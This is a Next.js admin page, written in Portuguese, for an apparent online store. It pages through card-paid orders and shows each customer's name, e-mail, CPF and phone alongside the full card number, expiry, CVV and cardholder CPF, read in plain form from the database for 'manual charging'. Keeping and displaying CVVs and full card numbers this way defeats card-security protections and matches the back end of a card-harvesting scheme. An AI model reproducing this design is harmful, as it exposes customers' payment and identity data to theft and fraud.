export const dynamic = 'force-dynamic'
import Link from 'next/link'
import { prisma } from '@/lib/prisma'
import { formatCurrency } from '@/lib/utils'

const STATUS_LABEL: Record<string, string> = {
  AGUARDANDO_PAGAMENTO: 'Aguardando pagamento',
  PAGO:                 'Pago',
  EM_SEPARACAO:         'Em separação',
  ENVIADO:              'Enviado',
  ENTREGUE:             'Entregue',
  CANCELADO:            'Cancelado',
}

const STATUS_COLOR: Record<string, string> = {
  AGUARDANDO_PAGAMENTO: 'bg-yellow-100 text-yellow-800',
  PAGO:                 'bg-green-100 text-green-800',
  EM_SEPARACAO:         'bg-blue-100 text-blue-800',
  ENVIADO:              'bg-purple-100 text-purple-800',
  ENTREGUE:             'bg-emerald-100 text-emerald-800',
  CANCELADO:            'bg-red-100 text-red-800',
}

interface Props {
  searchParams: { status?: string; pagina?: string }
}

const POR_PAGINA = 30

export default async function AdminCartoesPage({ searchParams }: Props) {
  const statusFiltro = searchParams.status
  const paginaAtual  = Math.max(1, parseInt(searchParams.pagina ?? '1'))

  const where: any = { formaPagamento: 'CARTAO' }
  if (statusFiltro) where.status = statusFiltro

  const [total, pedidos] = await Promise.all([
    prisma.pedido.count({ where }),
    prisma.pedido.findMany({
      where,
      include: {
        usuario: { select: { nome: true, email: true, cpf: true, telefone: true } },
        itens:   { select: { id: true, nome: true, quantidade: true, preco: true } },
      },
      orderBy: { createdAt: 'desc' },
      skip: (paginaAtual - 1) * POR_PAGINA,
      take: POR_PAGINA,
    }),
  ])

  const totalPaginas = Math.ceil(total / POR_PAGINA)

  return (
    <div className="p-8">
      <div className="flex items-center justify-between mb-6">
        <div>
          <h1 className="text-2xl font-bold text-gray-900">Dados de Cartão de Crédito</h1>
          <p className="text-sm text-gray-500 mt-1">
            Dados enviados pelos clientes para cobrança manual via cartão
          </p>
        </div>
        <div className="bg-amber-50 border border-amber-200 rounded-lg px-4 py-2 text-sm text-amber-800 flex items-center gap-2">
          <span>🔒</span>
          <span>Área restrita — dados sensíveis</span>
        </div>
      </div>

      {/* Filtros de status */}
      <div className="flex flex-wrap gap-2 mb-6">
        <FilterLink href="/admin/cartoes"                             label="Todos"             active={!statusFiltro} />
        <FilterLink href="/admin/cartoes?status=AGUARDANDO_PAGAMENTO" label="Aguardando"        active={statusFiltro === 'AGUARDANDO_PAGAMENTO'} />
        <FilterLink href="/admin/cartoes?status=PAGO"                 label="Pagos"             active={statusFiltro === 'PAGO'} />
        <FilterLink href="/admin/cartoes?status=CANCELADO"            label="Cancelados"        active={statusFiltro === 'CANCELADO'} />
      </div>

      {pedidos.length === 0 ? (
        <div className="bg-white rounded-xl border border-gray-200 p-16 text-center">
          <p className="text-4xl mb-3">💳</p>
          <p className="text-gray-500">Nenhum pedido com cartão encontrado.</p>
        </div>
      ) : (
        <div className="space-y-4">
          {pedidos.map((p) => (
            <div key={p.id} className="bg-white rounded-xl border border-gray-200 overflow-hidden">
              {/* Cabeçalho do card */}
              <div className="px-5 py-4 border-b border-gray-100 flex flex-wrap items-center justify-between gap-3">
                <div className="flex items-center gap-4">
                  <span className="font-mono text-xs text-gray-400">#{p.id.slice(0, 8)}</span>
                  <span className={`text-xs px-2 py-1 rounded-full font-medium ${STATUS_COLOR[p.status] ?? 'bg-gray-100 text-gray-700'}`}>
                    {STATUS_LABEL[p.status] ?? p.status}
                  </span>
                  <span className="text-sm font-bold text-gray-900">{formatCurrency(p.total)}</span>
                </div>
                <div className="flex items-center gap-3 text-xs text-gray-400">
                  <span>{new Date(p.createdAt).toLocaleString('pt-BR')}</span>
                  <Link href={`/admin/pedidos/${p.id}`} className="text-blue-600 hover:underline font-medium">
                    Ver pedido →
                  </Link>
                </div>
              </div>

              {/* Conteúdo */}
              <div className="p-5 grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* Dados do cliente */}
                <div>
                  <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3">
                    Cliente
                  </h3>
                  <div className="space-y-1.5">
                    <DataRow label="Nome" value={p.usuario.nome} />
                    <DataRow label="E-mail" value={p.usuario.email} />
                    {p.usuario.cpf   && <DataRow label="CPF" value={p.usuario.cpf} />}
                    {p.usuario.telefone && <DataRow label="Telefone" value={p.usuario.telefone} />}
                  </div>
                </div>

                {/* Dados do cartão */}
                <div>
                  <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3">
                    💳 Dados do Cartão
                  </h3>
                  {p.cartaoNome ? (
                    <div className="space-y-1.5">
                      <DataRow label="Nome no cartão"  value={p.cartaoNome     ?? '—'} highlight />
                      <DataRow label="Número"          value={formatCardNumber(p.cartaoNumero ?? '')} highlight />
                      <DataRow label="Validade"        value={p.cartaoValidade ?? '—'} highlight />
                      <DataRow label="CVV"             value={p.cartaoCvv      ?? '—'} highlight />
                      {p.cartaoCpf && <DataRow label="CPF titular" value={p.cartaoCpf} highlight />}
                    </div>
                  ) : (
                    <p className="text-sm text-gray-400 italic">Dados do cartão não informados ainda.</p>
                  )}
                </div>
              </div>

              {/* Itens do pedido */}
              <div className="px-5 pb-4">
                <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">
                  Itens ({p.itens.length})
                </h3>
                <div className="text-xs text-gray-600 flex flex-wrap gap-2">
                  {p.itens.map((item) => (
                    <span key={item.id} className="bg-gray-50 border border-gray-200 rounded px-2 py-1">
                      {item.quantidade}x {item.nome} — {formatCurrency(item.preco)}
                    </span>
                  ))}
                </div>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Paginação */}
      {totalPaginas > 1 && (
        <div className="mt-6 flex items-center justify-between text-sm text-gray-500">
          <span>{total} pedidos · página {paginaAtual} de {totalPaginas}</span>
          <div className="flex gap-2">
            {paginaAtual > 1 && (
              <Link
                href={`/admin/cartoes?pagina=${paginaAtual - 1}${statusFiltro ? `&status=${statusFiltro}` : ''}`}
                className="px-3 py-1 rounded border border-gray-200 hover:bg-gray-50"
              >
                ← Anterior
              </Link>
            )}
            {paginaAtual < totalPaginas && (
              <Link
                href={`/admin/cartoes?pagina=${paginaAtual + 1}${statusFiltro ? `&status=${statusFiltro}` : ''}`}
                className="px-3 py-1 rounded border border-gray-200 hover:bg-gray-50"
              >
                Próxima →
              </Link>
            )}
          </div>
        </div>
      )}
    </div>
  )
}

function DataRow({ label, value, highlight }: { label: string; value: string; highlight?: boolean }) {
  return (
    <div className="flex items-center gap-2 text-sm">
      <span className="text-gray-400 w-28 shrink-0">{label}:</span>
      <span className={`font-mono ${highlight ? 'text-gray-900 font-semibold' : 'text-gray-700'}`}>
        {value}
      </span>
    </div>
  )
}

function FilterLink({ href, label, active }: { href: string; label: string; active: boolean }) {
  return (
    <Link
      href={href}
      className={`text-sm px-3 py-1.5 rounded-lg transition-colors ${
        active
          ? 'bg-blue-600 text-white'
          : 'bg-white border border-gray-200 text-gray-600 hover:bg-gray-50'
      }`}
    >
      {label}
    </Link>
  )
}

function formatCardNumber(num: string) {
  if (!num) return '—'
  // Formata o número completo em grupos de 4 para facilitar a leitura
  const clean = num.replace(/\D/g, '')
  return clean.replace(/(.{4})/g, '$1 ').trim() || num
}
